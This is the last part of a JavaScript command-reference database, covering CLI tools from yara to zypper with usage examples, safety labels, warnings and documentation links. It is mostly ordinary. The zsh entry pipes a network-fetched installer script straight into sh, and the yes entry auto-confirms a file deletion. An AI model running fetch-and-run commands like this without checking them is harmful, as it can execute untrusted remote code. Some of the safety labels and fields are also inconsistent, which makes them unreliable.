        "reason": "System-level malware detection"
      }
    ],
    "warnings": [
      "Rule quality affects detection accuracy",
      "Memory scanning requires elevated privileges",
      "False positives possible with overly broad rules"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://yara.readthedocs.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "yarn",
    "subtitle": "Yet Another Resource Negotiator",
    "description": "Fast, reliable package manager alternative to npm",
    "examples": [
      "yarn init -y  # Create package.json with default configuration",
      "yarn install  # Install all dependencies from package.json",
      "yarn add react  # Install React as production dependency",
      "yarn add --dev webpack  # Install Webpack as development dependency",
      "yarn global add create-react-app  # Install create-react-app globally",
      "yarn upgrade  # Upgrade all dependencies to latest versions",
      "yarn remove lodash  # Uninstall lodash from project",
      "yarn start  # Execute 'start' script from package.json",
      "yarn outdated  # List packages with available updates"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "yarn [command] [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "React project setup",
        "commands": "yarn init -y && yarn add react react-dom && yarn add --dev @babel/core webpack",
        "explanation": "Initialize React project with build tools",
        "title": "yarn && yarn && yarn"
      },
      {
        "scenario": "Package maintenance",
        "commands": "yarn outdated && yarn upgrade && yarn audit",
        "explanation": "Check outdated packages, upgrade, and audit security",
        "title": "yarn && yarn && yarn"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "alternative",
        "reason": "Original Node.js package manager"
      },
      {
        "name": "pnpm",
        "relationship": "similar",
        "reason": "Another fast package manager alternative"
      },
      {
        "name": "node",
        "relationship": "combo",
        "reason": "Yarn manages packages for Node.js projects"
      }
    ],
    "warnings": [
      "yarn.lock file should be committed for consistent installs",
      "Different lockfile format than npm",
      "Some npm-specific features may not be available"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://classic.yarnpkg.com/en/docs"
      },
      {
        "platform": "macos",
        "url": "https://classic.yarnpkg.com/en/docs"
      },
      {
        "platform": "windows",
        "url": "https://classic.yarnpkg.com/en/docs"
      },
      {
        "platform": "generic",
        "url": "https://classic.yarnpkg.com/en/docs/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "yes",
    "subtitle": "yes",
    "description": "Output string repeatedly until terminated",
    "examples": [
      "yes | apt upgrade  # Automatically answer 'yes' to all package upgrade prompts",
      "yes 'test line' | head -1000 > testfile.txt  # Create file with 1000 lines of 'test line'",
      "yes | head -c 1GB > largefile.txt  # Create 1GB file filled with 'y' characters",
      "yes 'default_value' | command_that_prompts  # Supply default answers to interactive command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "yes [string]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Stress test system with I/O",
        "commands": "yes | dd of=/dev/null bs=1M count=1000",
        "explanation": "Generate continuous output for I/O performance testing",
        "title": "yes | dd"
      },
      {
        "scenario": "Auto-confirm dangerous operations",
        "commands": "yes | rm -i *.tmp",
        "explanation": "Automatically confirm deletion of temporary files",
        "title": "yes | rm"
      }
    ],
    "relatedCommands": [
      {
        "name": "head",
        "relationship": "combo",
        "reason": "Limit yes output with head to create finite test data"
      },
      {
        "name": "dd",
        "relationship": "combo",
        "reason": "Use with dd for generating test data or stress testing"
      },
      {
        "name": "expect",
        "relationship": "alternative",
        "reason": "More sophisticated automation of interactive programs"
      }
    ],
    "warnings": [
      "Will run forever until interrupted with Ctrl+C",
      "Can fill disk quickly when redirected to files",
      "May not work with all interactive programs"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/yes.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/yes.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/yes-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "youtube-dl",
    "subtitle": "YouTube Downloader",
    "description": "Download videos from YouTube and other video sites",
    "examples": [
      "youtube-dl 'https://www.youtube.com/watch?v=VIDEO_ID'  # Download video in best available quality",
      "youtube-dl -x --audio-format mp3 'https://www.youtube.com/watch?v=VIDEO_ID'  # Extract audio and convert to MP3",
      "youtube-dl -i 'https://www.youtube.com/playlist?list=PLAYLIST_ID'  # Download entire playlist, ignoring errors",
      "youtube-dl -F 'https://www.youtube.com/watch?v=VIDEO_ID'  # Show all available video/audio formats",
      "youtube-dl -f 'bestvideo[height<=720]+bestaudio/best[height<=720]' URL  # Download best quality up to 720p",
      "youtube-dl --write-sub --sub-lang en URL  # Download video with English subtitles"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "youtube-dl [options] URL",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Archive entire channel",
        "commands": "youtube-dl -i --download-archive archive.txt --write-description --write-info-json 'https://www.youtube.com/channel/CHANNEL_ID'",
        "explanation": "Download all videos with metadata, track what's downloaded",
        "title": "youtube"
      },
      {
        "scenario": "Podcast-style audio download",
        "commands": "youtube-dl -x --audio-format mp3 --audio-quality 0 --embed-thumbnail PLAYLIST_URL",
        "explanation": "Download playlist as high-quality MP3 with thumbnails",
        "title": "youtube"
      }
    ],
    "relatedCommands": [
      {
        "name": "yt-dlp",
        "relationship": "alternative",
        "reason": "Fork of youtube-dl with additional features and updates"
      },
      {
        "name": "ffmpeg",
        "relationship": "combo",
        "reason": "youtube-dl uses ffmpeg for format conversion"
      },
      {
        "name": "curl",
        "relationship": "similar",
        "reason": "Both download content from web, different specializations"
      }
    ],
    "warnings": [
      "Site changes can break download functionality",
      "Rate limiting may slow down downloads",
      "Some videos may be geo-blocked or require authentication"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/ytdl-org/youtube-dl"
      },
      {
        "platform": "macos",
        "url": "https://github.com/ytdl-org/youtube-dl"
      },
      {
        "platform": "windows",
        "url": "https://github.com/ytdl-org/youtube-dl"
      },
      {
        "platform": "generic",
        "url": "https://github.com/ytdl-org/youtube-dl/blob/master/README.md"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "yt-dlp",
    "subtitle": "YouTube DL Plus",
    "description": "Enhanced YouTube downloader with additional features",
    "examples": [
      "yt-dlp 'https://www.youtube.com/watch?v=VIDEO_ID'  # Download in highest available quality",
      "yt-dlp -o '%(uploader)s - %(title)s.%(ext)s' URL  # Use custom filename template with uploader and title",
      "yt-dlp --cookies-from-browser chrome URL  # Use browser cookies for authentication",
      "yt-dlp --sponsorblock-mark all --sponsorblock-remove sponsor URL  # Mark and remove sponsored segments",
      "yt-dlp --live-from-start URL  # Download live stream from beginning",
      "yt-dlp --write-thumbnail --convert-thumbnails jpg URL  # Download video thumbnail as JPEG",
      "yt-dlp -U  # Update yt-dlp to latest version"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "yt-dlp [options] URL",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete media archival",
        "commands": "yt-dlp --write-description --write-info-json --write-thumbnail --write-comments --write-subs URL",
        "explanation": "Download video with all metadata and subtitles",
        "title": "yt"
      },
      {
        "scenario": "High-quality audio extraction",
        "commands": "yt-dlp -x --audio-format flac --audio-quality 0 --embed-thumbnail URL",
        "explanation": "Extract highest quality audio as FLAC with thumbnail",
        "title": "yt"
      }
    ],
    "relatedCommands": [
      {
        "name": "youtube-dl",
        "relationship": "alternative",
        "reason": "Original project that yt-dlp is based on"
      },
      {
        "name": "ffmpeg",
        "relationship": "combo",
        "reason": "yt-dlp uses ffmpeg for post-processing"
      },
      {
        "name": "gallery-dl",
        "relationship": "similar",
        "reason": "Downloads media from image galleries and boorus"
      }
    ],
    "warnings": [
      "Frequent updates needed due to site changes",
      "Some features require ffmpeg installation",
      "Large playlists can take considerable time and space"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/yt-dlp/yt-dlp"
      },
      {
        "platform": "macos",
        "url": "https://github.com/yt-dlp/yt-dlp"
      },
      {
        "platform": "windows",
        "url": "https://github.com/yt-dlp/yt-dlp"
      },
      {
        "platform": "generic",
        "url": "https://github.com/yt-dlp/yt-dlp/wiki"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "yum",
    "subtitle": "Yellowdog Updater Modified",
    "description": "Package manager for Red Hat-based Linux distributions",
    "examples": [
      "sudo yum check-update  # Check for available package updates",
      "sudo yum install httpd  # Install Apache HTTP server",
      "sudo yum update  # Upgrade all installed packages to latest versions",
      "sudo yum remove package-name  # Uninstall specified package",
      "yum search keyword  # Find packages containing keyword in name or description",
      "yum info package-name  # Display detailed package information",
      "yum list installed  # Show all currently installed packages"
    ],
    "platform": [
      "linux"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "yum [options] <command> [package]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System maintenance",
        "commands": "sudo yum update && sudo yum clean all",
        "explanation": "Update system and clean package cache",
        "title": "sudo && sudo"
      },
      {
        "scenario": "Install group of packages",
        "commands": "sudo yum groupinstall 'Development Tools'",
        "explanation": "Install entire group of development packages",
        "title": "sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "dnf",
        "relationship": "alternative",
        "reason": "Modern replacement for yum in newer Fedora/RHEL"
      },
      {
        "name": "rpm",
        "relationship": "combo",
        "reason": "Low-level package manager that yum uses"
      },
      {
        "name": "apt",
        "relationship": "similar",
        "reason": "Package manager for Debian-based systems"
      }
    ],
    "warnings": [
      "Replaced by dnf in newer Red Hat distributions",
      "Requires EPEL repository for additional packages",
      "May conflict with manual RPM installations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/yum.8.html"
      },
      {
        "platform": "generic",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/ch-yum"
      }
    ],
    "distroNotes": {
      "linux": "RHEL, CentOS, Fedora (older versions)"
    }
  },
  {
    "name": "zabbix",
    "subtitle": "Zabbix Monitoring",
    "description": "Enterprise monitoring solution for networks, servers and applications",
    "examples": [
      "zabbix_server -c /etc/zabbix/zabbix_server.conf  # Start Zabbix server with configuration file",
      "zabbix_agentd -c /etc/zabbix/zabbix_agentd.conf  # Start Zabbix agent daemon",
      "zabbix_agentd -t system.cpu.load[all,avg1]  # Test specific agent item",
      "zabbix_agentd -p  # Print list of supported agent items"
    ],
    "platform": [
      "linux",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "zabbix_server [options]",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Start server and agent",
        "commands": "zabbix_server -c /etc/zabbix/zabbix_server.conf && zabbix_agentd -c /etc/zabbix/zabbix_agentd.conf",
        "explanation": "Start both server and agent components",
        "title": "zabbix_server && zabbix_agentd"
      }
    ],
    "relatedCommands": [
      {
        "name": "nagios",
        "relationship": "alternative",
        "reason": "Both provide enterprise monitoring solutions"
      },
      {
        "name": "snmp",
        "relationship": "combo",
        "reason": "Zabbix can collect SNMP data"
      }
    ],
    "warnings": [
      "Requires database setup (MySQL/PostgreSQL)",
      "Web interface needs PHP and web server",
      "Complex installation and configuration"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.zabbix.com/documentation/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "zcat",
    "subtitle": "Compressed Cat",
    "description": "Display contents of compressed files without decompressing",
    "examples": [
      "zcat file.txt.gz  # Display contents of gzipped file without extracting",
      "zcat logfile.gz | grep ERROR  # Search for errors in compressed log file",
      "zcat data.csv.gz | wc -l  # Count lines in compressed CSV file",
      "zcat archive.sql.gz | mysql database  # Restore database from compressed SQL dump"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "zcat [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Analyze compressed logs",
        "commands": "zcat access.log.gz | awk '{print $1}' | sort | uniq -c | sort -nr",
        "explanation": "Count unique IP addresses from compressed access log",
        "title": "zcat | awk | sort | uniq | sort"
      }
    ],
    "relatedCommands": [
      {
        "name": "zless",
        "relationship": "similar",
        "reason": "zless allows paging through compressed files"
      },
      {
        "name": "zgrep",
        "relationship": "similar",
        "reason": "zgrep searches compressed files directly"
      }
    ],
    "warnings": [
      "Works only with gzip-compressed files",
      "Cannot seek backwards like with regular files"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/zcat.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/zcat.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man1/zcat.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "zeek",
    "subtitle": "Zeek (formerly Bro)",
    "description": "Network security monitoring platform for traffic analysis",
    "examples": [
      "zeek -i eth0 local  # Monitor network interface with local policy",
      "zeek -r capture.pcap local  # Analyze captured packets with Zeek",
      "zeek -i eth0 policy/misc/conn-add-geodata  # Monitor connections with geographic data",
      "zeek -r capture.pcap custom-analysis.zeek  # Run custom Zeek script on capture file"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "zeek [options] <policy-script>",
    "prerequisites": [
      "expert"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive network analysis",
        "commands": "zeek -r capture.pcap local && zeek-cut ts id.orig_h id.resp_h service < conn.log",
        "explanation": "Generate logs and extract connection summary",
        "title": "zeek && zeek < conn"
      }
    ],
    "relatedCommands": [
      {
        "name": "suricata",
        "relationship": "combo",
        "reason": "Complementary network security monitoring"
      },
      {
        "name": "tcpdump",
        "relationship": "combo",
        "reason": "Packet capture for Zeek analysis"
      }
    ],
    "warnings": [
      "Learning curve for Zeek scripting language",
      "Can generate large amounts of log data",
      "Requires understanding of network protocols"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.zeek.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "zfs",
    "subtitle": "ZFS Filesystem",
    "description": "Advanced filesystem with built-in volume management and data protection",
    "examples": [
      "sudo zpool create mypool /dev/sdb /dev/sdc  # Create ZFS pool with two devices",
      "sudo zfs create mypool/data  # Create dataset within ZFS pool",
      "sudo zfs snapshot mypool/data@backup-$(date +%Y%m%d)  # Create timestamped snapshot of dataset",
      "zfs list -t snapshot  # Show all ZFS snapshots",
      "zpool status  # Display status of all ZFS pools",
      "sudo zfs set compression=lz4 mypool/data  # Enable LZ4 compression on dataset"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "zfs [command] [options] dataset",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "ZFS dataset with backup",
        "commands": "sudo zfs create mypool/important && sudo zfs set compression=lz4 mypool/important && sudo zfs snapshot mypool/important@daily",
        "explanation": "Create dataset, enable compression, take snapshot",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "zpool",
        "relationship": "combo",
        "reason": "Manage ZFS storage pools"
      }
    ],
    "warnings": [
      "Requires significant RAM for optimal performance",
      "Pool expansion requires careful planning"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://openzfs.github.io/openzfs-docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "zip",
    "subtitle": "zip",
    "description": "Create and manipulate ZIP archives",
    "examples": [
      "zip -r project.zip project/  # Create ZIP file containing entire directory",
      "zip archive.zip newfile.txt  # Add single file to existing ZIP archive",
      "zip -e secure.zip sensitive-data.txt  # Create encrypted ZIP file with password prompt",
      "zip -r backup.zip project/ -x '*.log' '*.tmp'  # Archive directory while excluding log and temporary files",
      "unzip archive.zip  # Extract all files from ZIP archive to current directory",
      "unzip -l archive.zip  # Show files in ZIP archive without extracting"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "zip [options] <archive.zip> [files...]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup and email archive",
        "commands": "zip -r backup-$(date +%Y%m%d).zip ~/documents && echo 'Backup complete' | mail -s 'Daily Backup' -A backup-*.zip admin@company.com",
        "explanation": "Create dated backup and email as attachment",
        "title": "zip && echo | mail"
      },
      {
        "scenario": "Selective extraction",
        "commands": "unzip -l archive.zip | grep '.pdf' && unzip archive.zip '*.pdf'",
        "explanation": "List PDF files in archive then extract only those",
        "title": "unzip | grep && unzip"
      }
    ],
    "relatedCommands": [
      {
        "name": "tar",
        "relationship": "alternative",
        "reason": "Better compression and more features, standard on Unix"
      },
      {
        "name": "7z",
        "relationship": "alternative",
        "reason": "Better compression ratios, more archive formats"
      },
      {
        "name": "gzip",
        "relationship": "similar",
        "reason": "Single file compression vs multi-file archives"
      }
    ],
    "warnings": [
      "ZIP doesn't preserve Unix permissions by default",
      "Windows and Unix line endings can cause issues",
      "Large files may hit ZIP format limitations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/zip.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/zip.html"
      },
      {
        "platform": "windows",
        "url": "Built into Windows Explorer or via command line"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "zipkin",
    "subtitle": "Zipkin Tracing",
    "description": "Distributed tracing system for troubleshooting latency problems",
    "examples": [
      "java -jar zipkin.jar  # Start Zipkin server with default settings",
      "java -jar zipkin.jar --server.port=9411  # Start Zipkin on custom port",
      "java -jar zipkin.jar --zipkin.self-tracing.enabled=true  # Enable Zipkin to trace its own operations",
      "java -jar zipkin.jar --zipkin.storage.type=elasticsearch  # Use Elasticsearch as storage backend"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "java -jar zipkin.jar [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Production with Elasticsearch",
        "commands": "java -jar zipkin.jar --zipkin.storage.type=elasticsearch --zipkin.storage.elasticsearch.hosts=http://localhost:9200",
        "explanation": "Production Zipkin with Elasticsearch storage",
        "title": "java"
      }
    ],
    "relatedCommands": [
      {
        "name": "jaeger",
        "relationship": "alternative",
        "reason": "Both provide distributed tracing"
      },
      {
        "name": "elasticsearch",
        "relationship": "combo",
        "reason": "Zipkin can use Elasticsearch for storage"
      }
    ],
    "warnings": [
      "Requires Java 8 or later",
      "Default port is 9411",
      "In-memory storage is not persistent"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://zipkin.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "zoxide",
    "subtitle": "zoxide",
    "description": "Smart cd command that learns your habits",
    "examples": [
      "z project  # Jump to most frequent/recent directory matching 'project'",
      "zi  # Open interactive menu to select from directory history",
      "zoxide add /path/to/dir  # Manually add directory to zoxide database",
      "zoxide remove /path/to/dir  # Remove directory from zoxide tracking",
      "zoxide query --list  # Show all tracked directories with their scores"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "z [query]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup zoxide in shell",
        "commands": "eval \"$(zoxide init bash)\"",
        "explanation": "Initialize zoxide for current shell session",
        "title": "eval"
      },
      {
        "scenario": "Backup directory database",
        "commands": "zoxide query --list > ~/.zoxide_backup",
        "explanation": "Export directory list for backup",
        "title": "zoxide >"
      }
    ],
    "relatedCommands": [
      {
        "name": "cd",
        "relationship": "alternative",
        "reason": "Traditional directory change, zoxide is smarter"
      },
      {
        "name": "autojump",
        "relationship": "similar",
        "reason": "Similar smart directory jumping tool"
      },
      {
        "name": "fasd",
        "relationship": "similar",
        "reason": "Command-line productivity booster for files and directories"
      }
    ],
    "warnings": [
      "Needs to be initialized in shell config file",
      "Requires building up usage history before becoming useful",
      "Query matching can be surprising until you learn the algorithm"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/ajeetdsouza/zoxide"
      },
      {
        "platform": "macos",
        "url": "https://github.com/ajeetdsouza/zoxide"
      },
      {
        "platform": "windows",
        "url": "https://github.com/ajeetdsouza/zoxide"
      },
      {
        "platform": "generic",
        "url": "https://github.com/ajeetdsouza/zoxide#installation"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "zsh",
    "subtitle": "Z Shell",
    "description": "Z shell with advanced features and customization",
    "examples": [
      "zsh  # Starts Z shell interactive session",
      "zsh myscript.sh  # Executes shell script using zsh interpreter",
      "zsh --version  # Displays current zsh version information"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "shell",
    "safety": "safe",
    "syntaxPattern": "zsh [options] [script]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup zsh with Oh My Zsh",
        "commands": "sh -c '$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)' && chsh -s $(which zsh)",
        "explanation": "Installs Oh My Zsh framework and sets zsh as default shell",
        "title": "sh && chsh"
      }
    ],
    "relatedCommands": [
      {
        "name": "bash",
        "relationship": "alternative",
        "reason": "Alternative shell with POSIX compliance"
      },
      {
        "name": "fish",
        "relationship": "alternative",
        "reason": "Alternative shell with user-friendly features"
      },
      {
        "name": "oh-my-zsh",
        "relationship": "framework",
        "reason": "Popular framework for managing zsh configuration"
      }
    ],
    "warnings": [
      "May have different syntax from bash for some operations",
      "Plugin system can slow down shell startup",
      "Some scripts written for bash may not work directly",
      "Configuration is in ~/.zshrc file"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://zsh.sourceforge.io/Doc/"
      },
      {
        "platform": "macos",
        "url": "https://zsh.sourceforge.io/Doc/"
      },
      {
        "platform": "windows",
        "url": "https://zsh.sourceforge.io/Doc/"
      },
      {
        "platform": "generic",
        "url": "https://zsh.sourceforge.io/Guide/"
      }
    ],
    "distroNotes": {
      "linux": "Available in most distribution repositories",
      "windows": "Available through WSL",
      "macos": "Default shell in macOS Catalina and later"
    }
  },
  {
    "name": "zstd",
    "subtitle": "Zstandard",
    "description": "Modern compression algorithm with excellent speed/ratio balance",
    "examples": [
      "zstd file.txt  # Compress file.txt to file.txt.zst",
      "zstd -d file.txt.zst  # Decompress file.txt.zst to file.txt",
      "zstd -10 file.txt  # Use compression level 10 (higher = better compression)",
      "zstd --fast=3 file.txt  # Use fast compression mode level 3",
      "zstd -c file.txt > file.txt.zst  # Compress to stdout, keeping original"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "zstd [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Modern backup compression",
        "commands": "tar -c directory/ | zstd -10 > backup.tar.zst",
        "explanation": "Create high-compression modern backup",
        "title": "tar | zstd > backup"
      }
    ],
    "relatedCommands": [
      {
        "name": "gzip",
        "relationship": "alternative",
        "reason": "Traditional compression, zstd is faster with similar ratios"
      },
      {
        "name": "lz4",
        "relationship": "similar",
        "reason": "Both are modern fast compression algorithms"
      }
    ],
    "warnings": [
      "Relatively new, may not be available on older systems",
      "Excellent balance of speed and compression ratio"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://facebook.github.io/zstd/"
      },
      {
        "platform": "macos",
        "url": "https://facebook.github.io/zstd/"
      },
      {
        "platform": "windows",
        "url": "https://facebook.github.io/zstd/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "zypper",
    "subtitle": "Zipper",
    "description": "Command-line package manager for openSUSE and SUSE Linux",
    "examples": [
      "zypper search nginx  # Search for packages containing nginx",
      "sudo zypper install nginx  # Install nginx package",
      "sudo zypper update  # Update all installed packages",
      "zypper repos  # Show configured repositories",
      "sudo zypper install -t pattern lamp_server  # Install LAMP server pattern",
      "sudo zypper addlock nginx  # Prevent nginx from being updated"
    ],
    "platform": [
      "linux"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "zypper [options] <command> [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System update workflow",
        "commands": "sudo zypper refresh && zypper list-updates && sudo zypper update",
        "explanation": "Refresh repos, check updates, apply updates",
        "title": "sudo && zypper && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "rpm",
        "relationship": "alternative",
        "reason": "Both work with RPM packages"
      }
    ],
    "warnings": [
      "Uses patterns for software collections",
      "Different syntax from other package managers"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://doc.opensuse.org/documentation/leap/reference/html/book-reference/cha-sw-cl.html"
      }
    ],
    "distroNotes": {}
  }
];

export default commandsDatabase;
